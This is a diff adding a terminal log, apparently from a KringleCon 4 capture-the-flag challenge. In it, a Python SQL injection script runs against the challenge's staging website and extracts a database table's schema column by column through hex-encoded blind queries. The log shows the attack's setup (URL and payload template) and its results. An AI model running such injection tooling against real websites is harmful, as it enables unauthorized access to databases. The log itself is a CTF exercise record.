@@ -1,0 +1,18 @@
+┌──(thedead㉿thinkali)-[~/Desktop/repos/Kringlecon4/12) Frost Tower Website Checkup]
+└─$ python2 frost_tower_SQLi.py 2>frost_tower_SQLi_stderr1.txt
+### Setup ###
+Base URL                 : https://staging.jackfrosttower.com/detail/PAYLOAD
+Base Query               : 1,QUERY_PAYLOAD
+Sleep Time               : 0.1
+### Run ###
+Table Schema encontact Table todo has 3 columns
+Table Schema encontact Table todo column #0 has a 4 char long hex encoded name
+Table Schema encontact Table todo column #0 has name id [hex 6964]
+Table Schema encontact Table todo column id has type INT
+Table Schema encontact Table todo column #1 has a 8 char long hex encoded name
+Table Schema encontact Table todo column #1 has name note [hex 6e6f7465]
+Table Schema encontact Table todo column note has type VARCHAR
+Table Schema encontact Table todo column #2 has a 18 char long hex encoded name
+Table Schema encontact Table todo column #2 has name completed [hex 636f6d706c65746564]
+Table Schema encontact Table todo column completed has type TINYINT
+Table Schema encontact Table todo Columns [{'columnName': 'id', 'columnType': 'INT', 'isPK': True}, {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False}, {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False}]
